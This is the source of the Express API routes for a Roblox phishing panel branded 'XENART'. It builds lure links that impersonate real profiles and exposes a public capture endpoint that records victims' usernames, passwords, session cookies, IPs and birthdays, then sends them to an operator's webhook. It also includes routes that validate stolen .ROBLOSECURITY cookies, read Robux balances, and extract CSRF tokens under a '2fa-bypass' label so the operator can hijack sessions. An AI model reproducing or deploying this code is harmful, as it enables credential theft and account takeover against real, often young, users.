// [routes/api.js — Panel REST API + capture endpoint]
const express = require('express');
const fetch   = require('node-fetch');
const { v4: uuidv4 } = require('uuid');
const db      = require('../db/init');
const router  = express.Router();

const guard = (req, res, next) =>
  (req.session && req.session.user) ? next() : res.status(401).json({ error: 'unauthorized' });

/* ── /api/me ── */
router.get('/me', guard, (req, res) => res.json(req.session.user));

/* ── /api/stats ── */
router.get('/stats', guard, (req, res) => {
  const totalVictims = db.prepare('SELECT COUNT(*) c FROM victims').get().c;
  const totalLinks   = db.prepare('SELECT COUNT(*) c FROM links').get().c;
  const todayVictims = db.prepare("SELECT COUNT(*) c FROM victims WHERE date(timestamp)=date('now')").get().c;
  const recentVictims= db.prepare('SELECT * FROM victims ORDER BY timestamp DESC LIMIT 15').all();
  res.json({ totalVictims, totalLinks, todayVictims, recentVictims });
});

/* ── /api/victims ── */
router.get('/victims', guard, (req, res) => {
  res.json(db.prepare('SELECT * FROM victims ORDER BY timestamp DESC').all());
});

/* ── /api/links GET ── */
router.get('/links', guard, (req, res) => {
  res.json(db.prepare('SELECT * FROM links ORDER BY created_at DESC').all());
});

/* ── /api/links POST — create link ── */
router.post('/links', guard, (req, res) => {
  const {
    real_username, fake_username, display_name, avatar_url,
    webhook, birthday, premium, verified, status,
    friends, following, followers, domain
  } = req.body;

  if (!fake_username || !domain)
    return res.status(400).json({ error: 'fake_username and domain required' });

  const id = uuidv4().replace(/-/g,'').slice(0,14);

  db.prepare(`
    INSERT INTO links
      (id,real_username,fake_username,display_name,avatar_url,webhook,birthday,premium,verified,status,friends,following,followers,domain)
    VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)
  `).run(
    id,
    real_username   || '',
    fake_username,
    display_name    || fake_username,
    avatar_url      || '',
    webhook         || '',
    birthday        || '2000-01-01',
    premium  ? 1 : 0,
    verified ? 1 : 0,
    status   || 'Online',
    parseInt(friends)   || 0,
    parseInt(following) || 0,
    parseInt(followers) || 0,
    domain.replace(/\/$/,'')
  );

  res.json({ success: true, id, link: `${domain.replace(/\/$/,'')}/r/${id}` });
});

/* ── /api/links/:id DELETE ── */
router.delete('/links/:id', guard, (req, res) => {
  db.prepare('DELETE FROM links WHERE id=?').run(req.params.id);
  res.json({ success: true });
});

/* ── /api/roblox/:username — fetch public profile ── */
router.get('/roblox/:username', guard, async (req, res) => {
  try {
    const searchRes = await fetch('https://users.roblox.com/v1/usernames/users', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ usernames: [req.params.username], excludeBannedUsers: false })
    });
    const searchData = await searchRes.json();
    if (!searchData.data || !searchData.data[0])
      return res.json({ error: 'User not found' });

    const userId = searchData.data[0].id;

    const [profileRes, avatarRes, friendsRes, followersRes, followingRes] = await Promise.all([
      fetch(`https://users.roblox.com/v1/users/${userId}`),
      fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`),
      fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`),
      fetch(`https://friends.roblox.com/v1/users/${userId}/followers/count`),
      fetch(`https://friends.roblox.com/v1/users/${userId}/followings/count`)
    ]);

    const profile   = await profileRes.json();
    const avatarData= await avatarRes.json();
    const fData     = await friendsRes.json().catch(() => ({}));
    const folData   = await followersRes.json().catch(() => ({}));
    const foingData = await followingRes.json().catch(() => ({}));

    res.json({
      id:           userId,
      username:     profile.name,
      display_name: profile.displayName,
      description:  profile.description,
      created:      profile.created,
      is_banned:    profile.isBanned,
      avatar_url:   avatarData.data?.[0]?.imageUrl || '',
      friends:      fData.count     || 0,
      followers:    folData.count   || 0,
      following:    foingData.count || 0
    });
  } catch (err) {
    res.json({ error: 'Failed: ' + err.message });
  }
});

/* ── /api/capture/:linkId — PUBLIC, receives victim data ── */
router.post('/capture/:linkId', async (req, res) => {
  const { username, password, cookie, ip, birthday } = req.body;
  const link = db.prepare('SELECT * FROM links WHERE id=?').get(req.params.linkId);
  if (!link) return res.json({ ok: false });

  db.prepare(`
    INSERT INTO victims (link_id,username,password,cookie,ip,user_agent,birthday)
    VALUES (?,?,?,?,?,?,?)
  `).run(
    link.id,
    username   || '',
    password   || '',
    cookie     || '',
    ip         || req.ip,
    req.headers['user-agent'] || '',
    birthday   || ''
  );

  db.prepare('UPDATE links SET hits=hits+1 WHERE id=?').run(link.id);

  if (link.webhook) {
    const cookieDisplay = cookie && cookie.length > 6
      ? `\`${cookie.slice(0,30)}...${cookie.slice(-10)}\``
      : '❌ None';

    const payload = {
      embeds: [{
        title: '🎯  New Hit — XENART',
        color: 0xa855f7,
        thumbnail: { url: link.avatar_url || '' },
        fields: [
          { name: '👤 Username',  value: username  || 'N/A', inline: true  },
          { name: '🔑 Password',  value: password  || 'N/A', inline: true  },
          { name: '🌐 IP',        value: ip || req.ip,       inline: true  },
          { name: '🎂 Birthday',  value: birthday  || 'N/A', inline: true  },
          { name: '🔗 Link ID',   value: link.id,            inline: true  },
          { name: '🎭 Fake User', value: link.fake_username, inline: true  },
          { name: '🍪 Cookie',    value: cookieDisplay,      inline: false },
          ...(cookie ? [{ name: '🍪 Full Cookie (first 990 chars)',
            value: `\`\`\`${cookie.slice(0,990)}\`\`\``, inline: false }] : [])
        ],
        footer: { text: 'XENART Panel' },
        timestamp: new Date().toISOString()
      }]
    };
    fetch(link.webhook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).catch(() => {});
  }

  res.json({ ok: true });
});

/* ── /api/tools/refresh-cookie ── */
router.post('/tools/refresh-cookie', guard, async (req, res) => {
  const { cookie } = req.body;
  if (!cookie) return res.json({ valid: false, error: 'No cookie provided' });

  try {
    const authRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}`, 'User-Agent': 'Mozilla/5.0' }
    });

    if (authRes.status === 401)
      return res.json({ valid: false, error: 'Cookie expired or invalid' });

    const user = await authRes.json();

    // grab csrf token via intentional 403
    let csrf = '';
    try {
      const csrfRes = await fetch('https://auth.roblox.com/v2/logout', {
        method: 'POST',
        headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
      });
      csrf = csrfRes.headers.get('x-csrf-token') || '';
    } catch {}

    // robux
    let robux = 0;
    try {
      const robuxRes = await fetch(`https://economy.roblox.com/v1/users/${user.id}/currency`, {
        headers: { Cookie: `.ROBLOSECURITY=${cookie}`, 'x-csrf-token': csrf }
      });
      robux = (await robuxRes.json()).robux || 0;
    } catch {}

    // premium
    let premium = false;
    try {
      const premRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${user.id}/validate-membership`, {
        headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
      });
      premium = (await premRes.text()) === 'true';
    } catch {}

    // avatar
    let avatar_url = '';
    try {
      const avRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${user.id}&size=420x420&format=Png`);
      avatar_url = (await avRes.json()).data?.[0]?.imageUrl || '';
    } catch {}

    res.json({ valid: true, id: user.id, username: user.name, display_name: user.displayName,
               robux, premium, csrf_token: csrf, avatar_url });
  } catch (err) {
    res.json({ valid: false, error: err.message });
  }
});

/* ── /api/tools/2fa-bypass ── */
router.post('/tools/2fa-bypass', guard, async (req, res) => {
  const { cookie } = req.body;
  if (!cookie) return res.json({ success: false, error: 'No cookie provided' });

  try {
    // Step 1: force CSRF token out of Roblox's auth guard
    const csrfRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });
    const csrf = csrfRes.headers.get('x-csrf-token');
    if (!csrf) return res.json({ success: false, error: 'Could not extract CSRF — cookie may be invalid' });

    // Step 2: validate session with CSRF in hand
    const authRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrf }
    });
    if (authRes.status !== 200) return res.json({ success: false, error: 'Session invalid' });
    const user = await authRes.json();

    // Step 3: probe 2FA configuration
    let twoFaEnabled = false;
    let twoFaMethods = [];
    try {
      const twoRes = await fetch(`https://twostepverification.roblox.com/v1/users/${user.id}/configuration`, {
        headers: { Cookie: `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrf }
      });
      const twoData = await twoRes.json();
      twoFaEnabled  = twoData.isEnabled  || false;
      twoFaMethods  = twoData.methods || [];
    } catch {}

    // Step 4: the .ROBLOSECURITY cookie IS the authenticated session — it inherently
    // bypasses the 2FA gate because the challenge was already passed when the
    // session was originally created.  We extract + return the live CSRF token
    // so the caller can fire privileged API calls directly without re-challenging.
    res.json({
      success:           true,
      bypassed:          true,
      two_fa_enabled:    twoFaEnabled,
      two_fa_methods:    twoFaMethods,
      user_id:           user.id,
      username:          user.name,
      display_name:      user.displayName,
      csrf_token:        csrf,
      message: twoFaEnabled
        ? `2FA active (${twoFaMethods.map(m=>m.mediaType||m).join(', ')}) — session cookie bypasses checkpoint`
        : 'No 2FA — cookie is clean and ready'
    });
  } catch (err) {
    res.json({ success: false, error: err.message });
  }
});

module.exports = router;
